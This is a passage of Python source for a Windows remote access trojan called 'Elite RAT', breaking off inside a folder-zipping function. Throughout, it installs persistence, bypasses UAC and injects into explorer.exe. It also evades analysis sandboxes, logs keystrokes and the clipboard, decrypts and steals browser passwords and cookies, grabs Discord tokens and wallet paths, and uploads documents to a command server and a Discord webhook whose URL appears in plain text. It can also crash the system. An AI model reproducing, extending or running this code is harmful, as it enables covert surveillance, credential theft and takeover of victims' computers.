import os
import sys
import time
import socket
import threading
import subprocess
import requests
import psutil
import base64
import json
import random
import string
from pathlib import Path
from io import BytesIO
import win32gui
import win32con
import win32api
import win32process
import winreg
import shutil
import ctypes
from datetime import datetime

# Graceful imports with fallbacks
try:
    import mss
    HAS_MSS = True
except:
    HAS_MSS = False
    print("MSS not available - using PIL fallback")

try:
    from PIL import ImageGrab, Image
    HAS_PIL = True
except:
    HAS_PIL = False

try:
    import socketio
    HAS_SOCKETIO = True
except:
    HAS_SOCKETIO = False

try:
    import cv2
    HAS_CV2 = True
except:
    HAS_CV2 = False

try:
    import pyautogui
    HAS_PYAUTOGUI = True
except:
    HAS_PYAUTOGUI = False

try:
    import sounddevice as sd
    HAS_SOUNDDEVICE = True
except:
    HAS_SOUNDDEVICE = False

# Config - XOR Obfuscated
def xor_cipher(data, key="elite"):
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# --- CONFIGURATION (Change this to your server) ---
# For Local Testing: SERVER_URL = "http://127.0.0.1:5000"
# For Render Deployment: SERVER_URL = "https://elite-rat-server.onrender.com"
SERVER_URL = "https://elite-rat-server.onrender.com"

# Original: DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1475224482393358446/mfIj5rvsQXY-KgwG0qV6CjISWA80EFv4j2-rqeANxQa7IpYF7hBEQJWpMedPT_q4SBMh"
ENCRYPTED_WEBHOOK = "-\x1c\x1d\x1d\x16\x1aN\x01\t\x16\x06\x0b\x17\x01\x1bN\x06\x0b\x08O\x04\x15\x0cO\x12\x01\x07\x0d\x0b\x0b\x0e\x11O\x14\x11\x12\x10\x17\x17\x11\x11\x1d\x1d\x13\x14\x13\x17\x11\x11\x15\x13\x16\x12\x17/(\x0c\x0c\x0b\x12\x10\x00\x17\x03\x16\x11Q\x13\x1cE\r\x02\x12\x0b\x16\x0b\x11\x1bV\x03\x02\x0f\x14\x18\x0b\x1e\x01\x0f\x03\x1aR\x0b\x0e\x1b\x00Y\x14\x12\x0b\x07\x1a\x17E\x1b\x01\x1bE\x0e\x15\x0e\x16\x1b\x01\x01\x1cZ_\x1c\x1dU["
DISCORD_WEBHOOK = xor_cipher(ENCRYPTED_WEBHOOK)

RAT_ID = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
EXE_NAME = "windowsservice.exe"

def get_current_exe_path():
    """Get the absolute path of the current running executable/script"""
    if getattr(sys, 'frozen', False):
        return Path(sys.executable).absolute()
    return Path(__file__).absolute()

EXE_PATH = get_current_exe_path()
CURRENT_DIR = EXE_PATH.parent

# --- Versioning & Auto-Update (Phase 6) ---
CURRENT_VERSION = "2.1"
GITHUB_USER = "XdKeerXd"
GITHUB_REPO = "elite-rat-server"
VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/main/version.json"

def check_for_updates():
    """Check GitHub for new version.json and auto-upgrade if found"""
    try:
        r = requests.get(VERSION_URL, timeout=10)
        if r.status_code == 200:
            data = r.json()
            remote_version = data.get("version", "0.0")
            update_url = data.get("url")
            
            if remote_version > CURRENT_VERSION and update_url:
                print(f"[UPDATE] New version found: {remote_version}. Starting upgrade...")
                # Log to C2 server if possible
                try: 
                    if sio_client and sio_client.connected:
                        sio_client.emit('cmd_result', {
                            'client_id': RAT_ID, 
                            'output': f'[AUTO-UPDATE] Version {remote_version} detected. Starting upgrade...'
                        })
                except: pass
                
                execute_update(update_url)
    except:
        pass

def execute_update(url):
    """Download new version and swap using batch script"""
    try:
        temp_path = Path.home() / "AppData\\Local\\Temp\\update_new.exe"
        r = requests.get(url, stream=True, timeout=30)
        with open(temp_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Batch script to kill current process, replace EXE, and restart
        batch_path = Path.home() / "AppData\\Local\\Temp\\updater.bat"
        with open(batch_path, "w") as f:
            f.write(f'@echo off\ntimeout /t 5 /nobreak > nul\n')
            f.write(f'taskkill /F /IM "{EXE_PATH.name}" /T > nul 2>&1\n')
            f.write(f'move /y "{temp_path}" "{EXE_PATH}"\n')
            f.write(f'start "" "{EXE_PATH}"\n')
            f.write(f'del "%~f0"\n')
        
        subprocess.Popen(["cmd.exe", "/c", str(batch_path)], creationflags=subprocess.DETACHED_PROCESS)
        os._exit(0)
    except:
        pass

# Disable PyAutoGUI delay and failsafe for remote control
if HAS_PYAUTOGUI:
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE = 0 # ZERO LATENCY

# Global state
sio_client = None
is_running = True
keylog_buffer = []
screen_streaming = False
webcam_streaming = False
audio_streaming = False
is_recording = False
current_monitor = 1
cmd_process = None

def hide_console():
    """Hide console window completely"""
    try:
        import win32console, win32gui
        win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)
    except:
        pass

def self_replicate():
    """Copy to multiple persistence locations"""
    locations = [
        Path.home() / "AppData\\Roaming\\Microsoft\\Windows\\svchost.exe",
        Path.home() / "AppData\\Local\\Temp\\svchost.exe",
        CURRENT_DIR / EXE_NAME,
        Path("C:\\Windows\\Temp\\svchost.exe")
    ]
    
    for loc in locations:
        try:
            loc.parent.mkdir(parents=True, exist_ok=True)
            if EXE_PATH != loc and not loc.exists():
                shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, loc)
        except:
            pass

def registry_persistence():
    """Add to Windows Registry startup"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, str(EXE_PATH))
        winreg.CloseKey(key)
    except:
        pass

def task_scheduler_persistence():
    """Create scheduled task"""
    try:
        subprocess.run([
            "schtasks", "/create", "/tn", "WindowsUpdate", 
            "/tr", f'"{EXE_PATH}"', "/sc", "onlogon", 
            "/rl", "highest", "/f"
        ], capture_output=True, timeout=10)
    except:
        pass

def startup_persistence():
    """Copy to Windows Startup folder"""
    try:
        startup_folder = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        dest = startup_folder / EXE_NAME
        if EXE_PATH != dest and not dest.exists():
            shutil.copy2(EXE_PATH, dest)
    except:
        pass

def send_to_discord():
    """Post system info and screenshot to Discord"""
    try:
        info = get_system_info()
        img_data = capture_screen()
        
        # Create a report message
        message = f"**Elite RAT Alert - New Target Online**\n"
        message += f"**ID:** `{RAT_ID}`\n"
        message += f"**User:** `{info.get('username')}`\n"
        message += f"**Host:** `{info.get('hostname')}`\n"
        message += f"**OS:** `{info.get('os')}`\n"
        message += f"**IP:** `{info.get('ip')}`\n"
        message += f"**Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        
        payload = {"content": message}
        
        if img_data:
            img_bytes = base64.b64decode(img_data)
            files = {"file": ("screenshot.jpg", img_bytes, "image/jpeg")}
            requests.post(DISCORD_WEBHOOK, data=payload, files=files, timeout=15)
        else:
            requests.post(DISCORD_WEBHOOK, json=payload, timeout=15)
    except:
        pass

def wmi_persistence():
    """WMI event persistence"""
    try:
        wmi_script = f'''
import os
import time
from datetime import datetime
import ctypes
while True:
    if not os.path.exists("{EXE_PATH}"):
        time.sleep(60)
        continue
    os.system(f'start "" "{EXE_PATH}"')
    time.sleep(300)
'''
        with open(CURRENT_DIR / "wmi_helper.py", "w") as f:
            f.write(wmi_script)
        subprocess.run([
            "wmic", "process", "call", "create", 
            f"python {CURRENT_DIR / 'wmi_helper.py'}"
        ], capture_output=True)
    except:
        pass

def install_persistence():
    """Install all persistence methods"""
    if check_vm():
        return
        
    self_replicate()
    registry_persistence()
    task_scheduler_persistence()
    startup_persistence()
    wmi_persistence()
    uac_bypass()

def check_persistence():
    """Verify all persistence methods are still active"""
    try:
        # Check Registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_READ)
        val, _ = winreg.QueryValueEx(key, "WindowsUpdate")
        winreg.CloseKey(key)
        if val != str(EXE_PATH): install_persistence()
    except:
        install_persistence()

def check_vm():
    """Enhanced Anti-Analysis: Returns list of detection reasons"""
    reasons = []
    
    # 1. Check MAC Address prefixes
    try:
        from uuid import getnode
        mac = ':'.join(['{:02x}'.format((getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
        prefixes = ["08:00:27", "00:05:69", "00:0c:29", "00:50:56"]
        if any(mac.lower().startswith(p) for p in prefixes): 
            reasons.append(f"VM MAC Detected: {mac}")
    except: pass

    # 2. Check for Analysis Tools
    analysis_tools = ["wireshark.exe", "x64dbg.exe", "processhacker.exe", "ghidra.exe", "ollydbg.exe", "vmmem.exe"]
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in analysis_tools: 
                reasons.append(f"Analysis Tool Found: {proc.info['name']}")
        except: pass

    # 3. Hardware Specs
    if psutil.cpu_count() < 2: 
        reasons.append(f"Low CPU count ({psutil.cpu_count()})")
    try:
        mem_gb = psutil.virtual_memory().total / (1024**3)
        if mem_gb < 2.5: reasons.append(f"Low RAM ({mem_gb:.1f}GB)")
        
        disk_gb = psutil.disk_usage('C:').total / (1024**3)
        if disk_gb < 60: reasons.append(f"Small Disk ({disk_gb:.1f}GB)")
    except: pass
    
    # 4. Check Drivers
    drivers = ["C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\vmmouse.sys"]
    for d in drivers:
        if os.path.exists(d): reasons.append(f"VM Driver Found: {os.path.basename(d)}")
    
    return reasons

def trigger_bsod(mode="real"):
    """Trigger a fake or real Blue Screen of Death"""
    try:
        if mode == "real":
            # Real BSOD via NtRaiseHardError (Requires Admin)
            import ctypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000005, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        else:
            # Fake BSOD using a full-screen tkinter window
            import tkinter as tk
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.configure(background='#0078d7')
            root.config(cursor="none")
            
            label = tk.Label(root, text=":(", font=("Segoe UI", 120), fg="white", bg="#0078d7")
            label.pack(pady=(100, 20))
            
            msg = "Your PC ran into a problem and needs to restart. We're just\ncollecting some error info, and then we'll restart for you."
            tk.Label(root, text=msg, font=("Segoe UI", 25), fg="white", bg="#0078d7", justify="left").pack(anchor="w", padx=150)
            
            tk.Label(root, text="0% complete", font=("Segoe UI", 25), fg="white", bg="#0078d7").pack(anchor="w", padx=150, pady=20)
            
            root.mainloop()
    except Exception as e:
        print(f"BSOD Error: {e}")

def get_system_metrics():
    """Collect CPU, RAM, and Network stats"""
    try:
        return {
            "cpu": psutil.cpu_percent(),
            "ram": psutil.virtual_memory().percent,
            "net_sent": psutil.net_io_counters().bytes_sent,
            "net_recv": psutil.net_io_counters().bytes_recv
        }
    except:
        return {"cpu": 0, "ram": 0, "net_sent": 0, "net_recv": 0}

def uac_bypass():
    """Fodhelper UAC Bypass"""
    if ctypes.windll.shell32.IsUserAnAdmin(): return True
    
    try:
        reg_path = "Software\\Classes\\ms-settings\\Shell\\Open\\command"
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, str(EXE_PATH))
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        # Trigger bypass
        subprocess.Popen("fodhelper.exe", shell=True)
        time.sleep(2)
        
        # Cleanup
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        sys.exit() # Exit original process
    except:
        return False

def inject_into_process(target="explorer.exe"):
    """
    Advanced migration logic using CreateRemoteThread and shellcode.
    """
    try:
        # 1. Get PID of explorer.exe
        pid = None
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == target.lower():
                pid = proc.pid
                break
        if not pid: return False

        # 2. Open Process
        PROCESS_ALL_ACCESS = 0x1F0FFF
        h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process: return False

        # 3. Path to this EXE
        path = str(EXE_PATH).encode('utf-16')
        path_len = len(path)

        # 4. Allocate Memory in Remote Process
        # MEM_COMMIT = 0x1000, PAGE_READWRITE = 0x04
        remote_mem = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, path_len, 0x1000, 0x04)
        if not remote_mem: return False

        # 5. Write Path to Remote Memory
        ctypes.windll.kernel32.WriteProcessMemory(h_process, remote_mem, path, path_len, None)

        # 6. Get LoadLibraryW Address
        h_kernel32 = ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = ctypes.windll.kernel32.GetProcAddress(h_kernel32, b"LoadLibraryW")

        # 7. Create Remote Thread
        h_thread = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_mem, 0, None)
        
        if h_thread:
            ctypes.windll.kernel32.CloseHandle(h_thread)
            ctypes.windll.kernel32.CloseHandle(h_process)
            return True
            
        ctypes.windll.kernel32.CloseHandle(h_process)
        return False
    except:
        return False

def get_system_info():
    """Collect system fingerprint"""
    try:
        return {
            "id": RAT_ID,
            "hostname": os.getenv("COMPUTERNAME", "unknown"),
            "username": os.getenv("USERNAME", "unknown"),
            "os": os.getenv("OS", "Windows"),
            "arch": "64-bit" if sys.maxsize > 2**32 else "32-bit",
            "ip": socket.gethostbyname(socket.gethostname()),
            "status": "online",
            "active_window": win32gui.GetWindowText(win32gui.GetForegroundWindow())
        }
    except:
        return {"id": RAT_ID, "status": "online"}

def safe_cmd_exec(command):
    """Execute CMD with better encoding and timeout"""
    global cmd_process
    try:
        if cmd_process and cmd_process.poll() is None:
            cmd_process.kill()
        
        # Use shell=True for complex commands, encoding cp437 for windows console
        cmd_process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_CONSOLE,
            text=True,
            encoding='cp437',
            errors='replace'
        )
        
        stdout, stderr = cmd_process.communicate(timeout=30)
        return_code = cmd_process.returncode or 0
        
        output = stdout or stderr or "No output"
        return {
            "output": output[:8000],  # Increased limit
            "return_code": return_code,
            "truncated": len(output) > 8000
        }
    except subprocess.TimeoutExpired:
        if cmd_process: cmd_process.kill()
        return {"output": "[TIMEOUT] Command took too long (30s)", "return_code": 124}
    except Exception as e:
        return {"output": f"[ERROR] {str(e)}", "return_code": 1}

def safe_ps_exec(command):
    """Execute PowerShell with isolation"""
    try:
        # PowerShell execution with bypass
        ps_command = f"powershell.exe -ExecutionPolicy Bypass -Command \"{command}\""
        process = subprocess.Popen(
            ps_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW,
            text=True,
            encoding='utf-8', # PowerShell usually uses UTF-8
            errors='replace'
        )
        
        stdout, stderr = process.communicate(timeout=35)
        return_code = process.returncode or 0
        
        output = stdout or stderr or "No output"
        return {
            "output": output[:8000],
            "return_code": return_code,
            "truncated": len(output) > 8000
        }
    except subprocess.TimeoutExpired:
        return {"output": "[TIMEOUT] PowerShell took too long (35s)", "return_code": 124}
    except Exception as e:
        return {"output": f"[ERROR] {str(e)}", "return_code": 1}

def capture_screen(monitor_idx=None, quality=30, resize_factor=0.7):
    """Capture screen with resizing and compression for better performance"""
    global current_monitor
    try:
        idx = monitor_idx if monitor_idx is not None else current_monitor
        if HAS_MSS:
            with mss.mss() as sct:
                if idx >= len(sct.monitors): idx = 0 # 0 is all monitors combined in MSS, 1 is first
                monitor = sct.monitors[idx]
                img_data = sct.grab(monitor)
                img = Image.frombytes("RGB", img_data.size, img_data.bgra, "raw", "BGRX")
        elif HAS_PIL:
            img = ImageGrab.grab()
        else:
            return None
        
        # Resize for performance if requested
        if resize_factor < 1.0:
            new_size = (int(img.width * resize_factor), int(img.height * resize_factor))
            img = img.resize(new_size, Image.LANCZOS)
            
        buffer = BytesIO()
        img.save(buffer, format='JPEG', quality=quality, optimize=True)
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        return None

def keylogger():
    """Silent keylogger with window title tracking"""
    global keylog_buffer
    last_window = ""
    
    def on_press(key):
        nonlocal last_window
        try:
            # 1. Capture window title change
            curr_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if curr_window != last_window:
                timestamp = datetime.now().strftime('%H:%M:%S')
                keylog_buffer.append(f"\n\n[WINDOW: {curr_window} | TIME: {timestamp}]\n")
                last_window = curr_window

            # 2. Capture Key
            k = ""
            try:
                k = key.char # alphanumeric
            except AttributeError:
                k = f"[{str(key)}]" # special keys
            
            if k == "[Key.space]": k = " "
            elif k == "[Key.enter]": k = "\n"
            elif k == "[Key.backspace]": k = "[BACK]"
            
            if k is None: k = "[UNKNOWN]"
            keylog_buffer.append(str(k))
            
            # Flush every 50 chars
            if len(keylog_buffer) > 50:
                flush_keys()
        except:
            pass
    
    try:
        from pynput import keyboard
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Keylogger error: {e}")

def flush_keys():
    """Send keylog buffer with ID and timestamp"""
    global keylog_buffer, sio_client
    if keylog_buffer:
        # Filter out any non-string items to prevent TypeError
        keys = ''.join(str(item) for item in keylog_buffer if item is not None)
        if sio_client and sio_client.connected:
            sio_client.emit('keys_data', {"client_id": RAT_ID, "keys": keys})
        keylog_buffer.clear()

def http_post(data):
    """HTTP heartbeat/fallback"""
    try:
        data["id"] = RAT_ID
        requests.post(f"{SERVER_URL}/heartbeat", json=data, timeout=10)
    except:
        pass

# --- Data Exfiltration (Phase 2) ---

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    from Crypto.Cipher import AES
    return AES.new(aes_key, AES.MODE_GCM, iv)

def get_master_key(path):
    import json
    import base64
    from Crypto.Protocol.KDF import PBKDF2
    
    with open(path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # remove DPAPI prefix
    
    # Decrypt master_key using DPAPI
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]

    def CryptUnprotectData(pDataIn, pOptionalEntropy=None, pvReserved=None, pPromptStruct=None, dwFlags=0):
        buffer_in = DATA_BLOB(len(pDataIn), ctypes.cast(ctypes.create_string_buffer(pDataIn), ctypes.c_void_p))
        buffer_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(buffer_in), None, None, None, None, 0, ctypes.byref(buffer_out)):
            return ctypes.string_at(buffer_out.pbData, buffer_out.cbData)
        return None

    return CryptUnprotectData(master_key)

def steal_browser_data(browser="Chrome"):
    """Generic Chromium-based browser stealer (Chrome, Edge, Brave, etc.) with dynamic profile discovery"""
    results = {"passwords": [], "cookies": []}
    paths = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data")
    }
    
    base_path = paths.get(browser)
    if not base_path or not os.path.exists(base_path): return results
    
    try:
        local_state_path = os.path.join(base_path, "Local State")
        if not os.path.exists(local_state_path): return results
        
        master_key = get_master_key(local_state_path)
        if not master_key: return results
        
        # Dynamically discover profiles (Default + Profile 1, 2, etc.)
        profiles = ["Default"]
        if os.path.exists(base_path):
            for item in os.listdir(base_path):
                if item.startswith("Profile ") and os.path.isdir(os.path.join(base_path, item)):
                    profiles.append(item)

        for profile in profiles:
            login_db = os.path.join(base_path, profile, "Login Data")
            cookie_db = os.path.join(base_path, profile, "Network", "Cookies")
            
            # 1. Steal Passwords
            if os.path.exists(login_db):
                try:
                    temp_db = os.path.join(os.environ["TEMP"], f"{browser}_{profile}_pw")
                    shutil.copy2(login_db, temp_db)
                    import sqlite3
                    from Crypto.Cipher import AES
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for url, user, encrypted_pw in cursor.fetchall():
                        try:
                            if not encrypted_pw: continue
                            iv = encrypted_pw[3:15]
                            payload = encrypted_pw[15:]
                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                            password = cipher.decrypt(payload)[:-16].decode()
                            results["passwords"].append(f"[{browser}|{profile}] {url} | {user} | {password}")
                        except: pass
                    conn.close()
                    os.remove(temp_db)
                except: pass

            # 2. Steal Cookies
            if os.path.exists(cookie_db):
                try:
                    temp_c = os.path.join(os.environ["TEMP"], f"{browser}_{profile}_ck")
                    shutil.copy2(cookie_db, temp_c)
                    import sqlite3
                    from Crypto.Cipher import AES
                    conn = sqlite3.connect(temp_c)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    for host, name, value in cursor.fetchall():
                        try:
                            if not value: continue
                            iv = value[3:15]
                            payload = value[15:]
                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                            cookie_val = cipher.decrypt(payload)[:-16].decode()
                            results["cookies"].append(f"{host}	TRUE	/	FALSE	2597573456	{name}	{cookie_val}")
                        except: pass
                    conn.close()
                    os.remove(temp_c)
                except: pass
    except: pass
    return results

def find_and_upload_docs():
    """Background task to find and exfiltrate sensitive documents"""
    exts = ['.docx', '.pdf', '.txt', '.xlsx', '.pptx', '.sql', '.conf']
    search_paths = [os.path.join(os.environ['USERPROFILE'], 'Documents'), os.path.join(os.environ['USERPROFILE'], 'Desktop')]
    
    found_files = []
    for s_path in search_paths:
        if not os.path.exists(s_path): continue
        for root, _, files in os.walk(s_path):
            if len(found_files) > 50: break # Cap for speed
            for f in files:
                if any(f.lower().endswith(e) for e in exts):
                    full_p = os.path.join(root, f)
                    if os.path.getsize(full_p) < 10 * 1024 * 1024: # < 10MB
                        found_files.append(full_p)
    
    # Upload found files
    for f_path in found_files:
        try:
            with open(f_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()
                sio_client.emit('exfiltrate_file', {
                    'client_id': RAT_ID,
                    'filename': os.path.basename(f_path),
                    'data': content
                })
        except: pass

def grab_discord_tokens():
    """Scan for Discord session tokens"""
    tokens = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    
    import re
    token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
    
    for name, path in paths.items():
        path = os.path.join(path, 'Local Storage', 'leveldb')
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(token_pattern, content)
                            for m in matches: tokens.append(f"[{name}] {m}")
                    except: pass
    return list(set(tokens))

def steal_wallets():
    """Scan for crypto wallet files"""
    wallets = []
    user_profile = os.environ['USERPROFILE']
    paths = {
        'Atomic': os.path.join(user_profile, 'AppData', 'Roaming', 'atomic', 'Local Storage', 'leveldb'),
        'Exodus': os.path.join(user_profile, 'AppData', 'Roaming', 'Exodus', 'exodus.wallet'),
        'Electrum': os.path.join(user_profile, 'AppData', 'Roaming', 'Electrum', 'wallets'),
        'MetaMask': os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
    }
    
    for name, path in paths.items():
        if os.path.exists(path):
            wallets.append(f"Found {name} wallet at: {path}")
            
    return wallets

def handle_steal_data(data):
    """Exfiltrate all stolen data to server"""
    try:
        full_report = {"passwords": [], "cookies": [], "tokens": [], "wallets": []}
        
        # 1. Browsers
        for b in ["Chrome", "Edge", "Brave"]:
            res = steal_browser_data(b)
            full_report["passwords"].extend(res["passwords"])
            full_report["cookies"].extend(res["cookies"])
        
        # 2. Discord/Telegram
        full_report["tokens"] = grab_discord_tokens()
        
        # 3. Wallets
        full_report["wallets"] = steal_wallets()
        
        # Send full report to server (Structured)
        sio_client.emit('stolen_report', {
            'client_id': RAT_ID,
            'data': full_report
        })
        
        # Background: search documents
        threading.Thread(target=find_and_upload_docs, daemon=True).start()
        
        showToast("Exfiltration task started", "info")
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[STEALER ERROR] {str(e)}'})

def clipboard_monitor_thread():
    """Background thread to monitor clipboard changes"""
    import win32clipboard
    last_clipboard = ""
    while is_running:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            if data != last_clipboard:
                last_clipboard = data
                sio_client.emit('keys_data', {"client_id": RAT_ID, "keys": f"\n[CLIPBOARD]: {data}\n"})
        except:
            try: win32clipboard.CloseClipboard()
            except: pass
        time.sleep(5)
# --- Advanced Control (Phase 3) ---

def socks5_handler(client_socket):
    """Simple SOCKS5 implementation"""
    try:
        # 1. Greeting
        client_socket.recv(262)
        client_socket.send(b"\x05\x00")
        
        # 2. Connection request
        data = client_socket.recv(4)
        if not data: return
        mode = data[1] # 1 = connect
        addr_type = data[3] # 1 = IPv4, 3 = Domain Name
        
        if addr_type == 1:
            addr = socket.inet_ntoa(client_socket.recv(4))
        elif addr_type == 3:
            host_len = client_socket.recv(1)[0]
            addr = client_socket.recv(host_len).decode()
        else: return
        
        port = int.from_bytes(client_socket.recv(2), 'big')
        
        # 3. Connect to Target
        try:
            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.connect((addr, port))
            client_socket.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2, 'big'))
        except:
            client_socket.send(b"\x05\x01\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2, 'big'))
            return
            
        # 4. Exchange Data
        def tunnel(source, destination):
            while True:
                try:
                    data = source.recv(4096)
                    if not data: break
                    destination.sendall(data)
                except: break
                
        threading.Thread(target=tunnel, args=(client_socket, remote), daemon=True).start()
        tunnel(remote, client_socket)
    except: pass
    finally:
        client_socket.close()

def socks5_proxy_thread():
    """Start SOCKS5 proxy on local port 9050"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind(("127.0.0.1", 9050))
        server.listen(10)
        while is_running:
            client, _ = server.accept()
            threading.Thread(target=socks5_handler, args=(client,), daemon=True).start()
    except: pass

def stream_audio_loop():
    """Real-time microphone stream using PyAudio"""
    global audio_streaming
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        while audio_streaming:
            data = stream.read(1024)
            sio_client.emit('audio_data', {
                'client_id': RAT_ID,
                'data': base64.b64encode(data).decode()
            })
        stream.stop_stream()
        stream.close()
        p.terminate()
    except: pass

# --- Process Management (Phase 4) ---

def handle_get_processes(data):
    """Fetch current process list using psutil"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            try:
                pinfo = proc.info
                processes.append({
                    'pid': pinfo['pid'],
                    'name': pinfo['name'],
                    'user': pinfo['username'],
                    'cpu': pinfo['cpu_percent'],
                    'mem': pinfo['memory_info'].rss / (1024 * 1024) # MB
                })
            except: pass
        sio_client.emit('process_list', {'client_id': RAT_ID, 'processes': processes})
    except: pass

def handle_kill_process(data):
    """Terminate a process by PID"""
    try:
        pid = data.get('pid')
        p = psutil.Process(pid)
        p.terminate()
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[PS] Terminated PID {pid}'})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[PS] Failed to kill PID {data.get("pid")}: {str(e)}'})

# --- Registry Browser (Phase 3) ---

# --- Advanced File Manager (Phase 5) ---

def handle_file_search(data):
    """Recursive file search with pattern matching"""
    try:
        path = data.get('path', 'C:\\')
        pattern = data.get('pattern', '*')
        matches = []
        for root, dirs, files in os.walk(path):
            if len(matches) > 100: break # Cap results
            for filename in files:
                if any(ext in filename.lower() for ext in pattern.split(',')):
                    matches.append(os.path.join(root, filename))
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[SEARCH] Found {len(matches)} matches:\n' + '\n'.join(matches)})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[SEARCH ERROR] {str(e)}'})

def handle_zip_folder(data):
    """Zip a folder for easier download"""
    try:
        folder_path = data.get('path')
        if not folder_path or not os.path.exists(folder_path): return
        
        import zipfile
        zip_path = os.path.join(os.environ['TEMP'], f"{os.path.basename(folder_path)}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    zipf.write(os.path.join(root, file), 
                               os.path.relpath(os.path.join(root, file), 
                               os.path.join(folder_path, '..')))
        
